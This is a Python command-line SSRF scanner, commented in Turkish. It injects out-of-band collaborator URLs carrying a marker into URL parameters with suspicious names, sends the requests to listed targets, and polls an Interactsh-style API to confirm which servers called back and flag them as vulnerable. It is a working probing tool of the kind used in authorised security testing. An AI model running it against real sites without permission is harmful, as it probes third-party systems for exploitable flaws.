#!/usr/bin/env python3
import argparse
import json
import time
from dataclasses import dataclass
from typing import Dict, List, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests


SSRF_PARAM_KEYWORDS = {
    "url",
    "uri",
    "path",
    "redirect",
    "redir",
    "next",
    "dest",
    "destination",
    "continue",
    "return",
    "return_to",
    "image",
    "img",
    "src",
    "source",
    "file",
    "feed",
    "endpoint",
    "proxy",
    "reference",
    "link",
    "callback",
    "webhook",
    "load",
}


@dataclass(frozen=True)
class Probe:
    target_url: str
    parameter: str
    marker: str


class InteractshVerifier:
    """Interactsh/benzeri OOB API uç noktasından callback kayıtlarını çekip marker eşleşmesi yapar."""

    def __init__(self, api_url: str, token: str = "", verify_tls: bool = True, timeout: int = 10) -> None:
        self.api_url = api_url
        self.token = token
        self.verify_tls = verify_tls
        self.timeout = timeout

    def _extract_text_pool(self, payload: object) -> List[str]:
        """JSON içindeki metin alanlarını düzleştirerek aranabilir bir havuz döndürür."""

        flattened: List[str] = []

        def _walk(node: object) -> None:
            if node is None:
                return
            if isinstance(node, (str, int, float, bool)):
                flattened.append(str(node))
                return
            if isinstance(node, dict):
                for value in node.values():
                    _walk(value)
                return
            if isinstance(node, list):
                for item in node:
                    _walk(item)

        _walk(payload)
        return flattened

    def fetch_markers(self) -> Set[str]:
        """OOB kayıtlarından TARGET_PARAM marker desenine uyanları toplar."""

        headers = {"Accept": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        try:
            response = requests.get(
                self.api_url,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_tls,
            )
            response.raise_for_status()
            data = response.json()
        except (requests.RequestException, json.JSONDecodeError):
            return set()

        markers: Set[str] = set()
        for text in self._extract_text_pool(data):
            if "/" not in text:
                continue
            # Beklenen format: http://collaborator/TARGET_PARAM
            parts = text.replace("\\n", " ").split()
            for token in parts:
                if "/" not in token:
                    continue
                marker = token.rsplit("/", 1)[-1].strip("\"' )]}")
                if "_" in marker and marker:
                    markers.add(marker)

        return markers


def is_ssrf_candidate(param_name: str) -> bool:
    """Parametre adını SSRF açısından anlamlı anahtar kelimelere göre filtreler."""

    lowered = param_name.lower()
    return any(keyword in lowered for keyword in SSRF_PARAM_KEYWORDS)


def build_payload(collaborator: str, target_domain: str, parameter: str) -> Tuple[str, str]:
    """İstenen formatta payload ve doğrulama marker'ı üretir."""

    sanitized_domain = target_domain.replace(":", "_")
    marker = f"{sanitized_domain}_{parameter}"
    payload = f"http://{collaborator}/{marker}"
    return payload, marker


def inject_query_parameter(url: str, parameter: str, payload: str) -> str:
    """URL query parametresinde tek bir alanı payload ile değiştirir."""

    parsed = urlparse(url)
    query_pairs = parse_qsl(parsed.query, keep_blank_values=True)

    new_pairs = []
    for key, value in query_pairs:
        if key == parameter:
            new_pairs.append((key, payload))
        else:
            new_pairs.append((key, value))

    new_query = urlencode(new_pairs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def load_urls(file_path: str) -> List[str]:
    """Dosyadan hedef URL listesini okur."""

    urls: List[str] = []
    with open(file_path, "r", encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            urls.append(line)
    return urls


def enumerate_probes(urls: List[str], collaborator: str) -> List[Probe]:
    """URL'lerde SSRF adayı parametreleri bulup test probe listesi oluşturur."""

    probes: List[Probe] = []
    for target in urls:
        parsed = urlparse(target)
        if not parsed.scheme or not parsed.netloc:
            continue

        params = parse_qsl(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, _ in params:
            if not is_ssrf_candidate(param):
                continue

            payload, marker = build_payload(collaborator, parsed.netloc, param)
            mutated_url = inject_query_parameter(target, param, payload)
            probes.append(Probe(target_url=mutated_url, parameter=param, marker=marker))

    return probes


def dispatch_probes(probes: List[Probe], timeout: int) -> None:
    """Hazırlanan probe URL'lerine düşük gürültülü GET istekleri gönderir."""

    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (compatible; SSRF-Checker/1.0)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close",
        }
    )

    for probe in probes:
        try:
            session.get(probe.target_url, timeout=timeout, allow_redirects=False)
        except requests.RequestException:
            continue


def poll_verified_markers(
    verifier: InteractshVerifier,
    expected_markers: Set[str],
    poll_interval: int,
    poll_timeout: int,
) -> Set[str]:
    """Belirli süre boyunca OOB API'yi yoklayarak doğrulanan marker'ları döndürür."""

    matched: Set[str] = set()
    started = time.time()

    while time.time() - started < poll_timeout:
        observed = verifier.fetch_markers()
        matched.update(observed.intersection(expected_markers))
        if matched == expected_markers:
            break
        time.sleep(poll_interval)

    return matched


def main() -> None:
    """CLI girdilerini alır, SSRF testlerini çalıştırır ve doğrulanan bulguları raporlar."""

    parser = argparse.ArgumentParser(description="Flag-based SSRF scanner with OOB verification")
    parser.add_argument("-i", "--input", required=True, help="URL listesi dosya yolu")
    parser.add_argument("-c", "--collaborator", required=True, help="OOB collaborator domain")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP istek zaman aşımı (sn)")
    parser.add_argument("--interactsh-api-url", required=True, help="Interactsh/OOB kayıt API endpoint")
    parser.add_argument("--interactsh-token", default="", help="OOB API Bearer token (opsiyonel)")
    parser.add_argument("--poll-timeout", type=int, default=60, help="OOB polling toplam süresi (sn)")
    parser.add_argument("--poll-interval", type=int, default=5, help="OOB polling aralığı (sn)")
    parser.add_argument("--insecure", action="store_true", help="TLS doğrulamasını kapat")
    args = parser.parse_args()

    urls = load_urls(args.input)
    probes = enumerate_probes(urls, args.collaborator)
    if not probes:
        return

    dispatch_probes(probes, timeout=args.timeout)

    verifier = InteractshVerifier(
        api_url=args.interactsh_api_url,
        token=args.interactsh_token,
        verify_tls=not args.insecure,
        timeout=args.timeout,
    )

    expected_map: Dict[str, Probe] = {probe.marker: probe for probe in probes}
    verified = poll_verified_markers(
        verifier=verifier,
        expected_markers=set(expected_map.keys()),
        poll_interval=args.poll_interval,
        poll_timeout=args.poll_timeout,
    )

    for marker in sorted(verified):
        probe = expected_map[marker]
        print(f"Target: {probe.target_url} | Param: {probe.parameter} | Status: VULNERABLE")


if __name__ == "__main__":
    main()
